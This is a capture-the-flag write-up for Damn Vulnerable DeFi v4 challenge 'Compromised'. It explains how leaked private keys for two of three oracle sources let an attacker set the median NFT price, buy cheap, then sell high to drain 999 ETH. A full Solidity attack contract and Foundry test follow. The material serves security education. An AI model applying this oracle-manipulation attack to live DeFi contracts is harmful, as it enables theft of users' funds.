# Statement

<img width="487" height="379" alt="image" src="https://github.com/user-attachments/assets/cc1feedc-956d-4060-9252-de2759b2e980" />

# Damn Vulnerable DeFi v4 – Challenge 7: **Compromised**

Goal:  
> Start with **0.1 ETH** and drain **all 999 ETH** from an NFT exchange that sells a token called **DVNFT**, using a compromised price oracle.

---

## 1. High-Level Story

- There is an NFT exchange on-chain:
  - It sells and buys **DVNFT**.
  - Each NFT is priced by an **oracle**.
  - Right now, each NFT is super overpriced at **999 ETH**.
- The oracle’s price is the **median** of 3 trusted sources.  
- You get a strange HTTP response from some web service that looks like this (shortened):

  ```text
  HTTP/2 200 OK
  content-type: text/html
  ...

  4d 48 67 33 5a 44 45 31 ...
  4d 48 67 32 4f 47 4a 6b ...

## Main idea:
If we can control 2 of the 3 oracle sources, we completely control the median price → we can make the NFT almost free, buy it, then pump the price and sell it back to drain the exchange.

## 2. Contracts Involved

There are three main contracts you need to understand:

### 2.1 `Exchange.sol`

This contract holds **999 ETH**. It allows users to buy and sell DVNFTs. When you call `buyOne()`, you must send ETH equal to the current oracle price of DVNFT. When you call `sellOne(tokenId)`, the exchange pays you the current oracle price and takes the NFT back. The exchange does not check if the price is “reasonable”; it fully trusts the oracle.

### 2.2 `TrustfulOracle.sol`

This contract stores the price for symbols like `"DVNFT"`. It has **three addresses** registered as “trusted sources.” Each source can call `postPrice(symbol, price)` to update the price. When someone asks for the price, the oracle reads the three reported values, sorts them, and returns the **median**.

For example, if the three sources report `[1, 10, 100]`, the median is `10`. If you control **two** of the three sources, you can make the median anything you want by making those two agree.

### 2.3 `TrustfulOracleInitializer.sol`

This contract is used at setup time to:

- Choose the three oracle source addresses.
- Set the initial price of DVNFT to 999 ETH.

You do not need to interact with this contract during the exploit, but it explains where the sources and initial price come from.

---

## 3. The Hidden Vulnerability (From Here On: Paragraph Style)

The challenge also gives you an HTTP response from some backend service. It contains long hex strings. These hex strings are not random; if you convert them from hex to ASCII, you get Base64 strings. If you then Base64-decode those strings, you end up with two **private keys**. When you derive the Ethereum addresses from those private keys, you find that they match **two of the three oracle sources** registered in `TrustfulOracle`. That is the core vulnerability: two trusted sources are fully compromised. Because price is the median of three values, controlling two of the three inputs means you effectively control the final price.

From an attacker’s point of view, this is extremely powerful. You can impersonate these oracle source addresses in your test environment (for example, by using `vm.prank` in Foundry with the leaked private keys). Once you do that, you can call `postPrice("DVNFT", price)` from each compromised source and set the price to any value you want. The third honest source does not matter anymore because the median of three numbers is always one of the middle values; with two votes, your side always wins.

---

## 4. Attack Plan: Buy Low, Sell High

The attack is straightforward once you understand that you can change the oracle price at will. First, you use the compromised oracle keys to push the price of DVNFT **down to almost zero**. You do this by calling `postPrice("DVNFT", 0)` from each of the two compromised sources. Now the three reported prices look like `[0, 0, 999 ether]`. When sorted, the median is `0`, so the oracle reports that a DVNFT is worth practically nothing.

With the NFT price this low, you call `exchange.buyOne()` from your attack contract and attach a tiny amount of ETH (for example, 1 wei is usually enough, depending on implementation). Because the oracle price is basically zero, you successfully buy a DVNFT from the exchange for almost free. At this point, you control one DVNFT and the exchange has lost almost no ETH.

Next, you flip the situation. Again using the compromised oracle keys, you set the price of DVNFT to a huge value, for example `999 ether`, which matches the entire ETH balance of the exchange. You call `postPrice("DVNFT", 999 ether)` from each of the two compromised sources. Now the three prices are `[999 ether, 999 ether, oldValue]`, and the median is `999 ether`. The oracle now says that one DVNFT is worth 999 ETH.

With that inflated price in place, you approve the exchange to transfer your NFT and call `exchange.sellOne(tokenId)`. The exchange checks the oracle, sees that DVNFT is “worth” 999 ETH, and pays your contract that amount in ETH, taking the NFT in return. Since the exchange started with 999 ETH, this completely drains its ETH balance into your attack contract.

Finally, to satisfy the level’s conditions, you send the stolen ETH from your attack contract to the provided `recovery` address. After this transfer, the exchange has no ETH left, and the recovery address holds the drained funds, which completes the challenge.

---

## 5. Full test code that contains the attack:

``` solidity
// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {VmSafe} from "forge-std/Vm.sol";

import {TrustfulOracle} from "../../src/compromised/TrustfulOracle.sol";
import {TrustfulOracleInitializer} from "../../src/compromised/TrustfulOracleInitializer.sol";
import {Exchange} from "../../src/compromised/Exchange.sol";
import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";
import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract CompromisedChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant EXCHANGE_INITIAL_ETH_BALANCE = 999 ether;
    uint256 constant INITIAL_NFT_PRICE = 999 ether;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;
    uint256 constant TRUSTED_SOURCE_INITIAL_ETH_BALANCE = 2 ether;


    address[] sources = [
        0x188Ea627E3531Db590e6f1D71ED83628d1933088,
        0xA417D473c40a4d42BAd35f147c21eEa7973539D8,
        0xab3600bF153A316dE44827e2473056d56B774a40
    ];
    string[] symbols = ["DVNFT", "DVNFT", "DVNFT"];
    uint256[] prices = [INITIAL_NFT_PRICE, INITIAL_NFT_PRICE, INITIAL_NFT_PRICE];

    TrustfulOracle oracle;
    Exchange exchange;
    DamnValuableNFT nft;

    modifier checkSolved() {
        _;
        _isSolved();
    }

    function setUp() public {
        startHoax(deployer);

        // Initialize balance of the trusted source addresses
        for (uint256 i = 0; i < sources.length; i++) {
            vm.deal(sources[i], TRUSTED_SOURCE_INITIAL_ETH_BALANCE);
        }

        // Player starts with limited balance
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);

        // Deploy the oracle and setup the trusted sources with initial prices
        oracle = (new TrustfulOracleInitializer(sources, symbols, prices)).oracle();

        // Deploy the exchange and get an instance to the associated ERC721 token
        exchange = new Exchange{value: EXCHANGE_INITIAL_ETH_BALANCE}(address(oracle));
        nft = exchange.token();

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        for (uint256 i = 0; i < sources.length; i++) {
            assertEq(sources[i].balance, TRUSTED_SOURCE_INITIAL_ETH_BALANCE);
        }
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(nft.owner(), address(0)); // ownership renounced
        assertEq(nft.rolesOf(address(exchange)), nft.MINTER_ROLE());
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_compromised() public checkSolved {

        uint256 privateKey1 = 0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744;
        uint256 privateKey2 = 0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159;

        address source1 = vm.addr(privateKey1);
        address source2 = vm.addr(privateKey2);

        AttackCompromised attackContract = new AttackCompromised{ value:address(this).balance }(
            oracle, exchange, nft, recovery
        );

        vm.prank(source1);
        oracle.postPrice(symbols[0], 0);
        vm.prank(source2);
        oracle.postPrice(symbols[0], 0);

        attackContract.buy();

        vm.prank(source1);
        oracle.postPrice(symbols[0], 999 ether);
        vm.prank(source2);
        oracle.postPrice(symbols[0], 999 ether);

        attackContract.sell();
        attackContract.recover(999 ether);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Exchange doesn't have ETH anymore
        assertEq(address(exchange).balance, 0);

        // ETH was deposited into the recovery account
        assertEq(recovery.balance, EXCHANGE_INITIAL_ETH_BALANCE);

        // Player must not own any NFT
        assertEq(nft.balanceOf(player), 0);

        // NFT price didn't change
        assertEq(oracle.getMedianPrice("DVNFT"), INITIAL_NFT_PRICE);
    }
}

contract AttackCompromised is IERC721Receiver {
    TrustfulOracle private immutable oracle;
    Exchange private immutable exchange;
    DamnValuableNFT private immutable nft;
    address private immutable recovery;
    uint256 private nftId;

    constructor(
        TrustfulOracle _oracle,
        Exchange _exchange,
        DamnValuableNFT _nft,
        address _recovery
    ) payable {
        oracle = _oracle;
        exchange = _exchange;
        nft = _nft;
        recovery = _recovery;
    }

    function buy() external payable {
        nftId = exchange.buyOne{value: 1}();
    }

    function sell() external payable {
        nft.approve(address(exchange), nftId);
        exchange.sellOne(nftId);
    }

    function recover(uint256 amount) external {
        payable(recovery).transfer(amount);
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes calldata
    ) external pure returns (bytes4) {
        return this.onERC721Received.selector;
    }

    receive () external payable {}
}
```
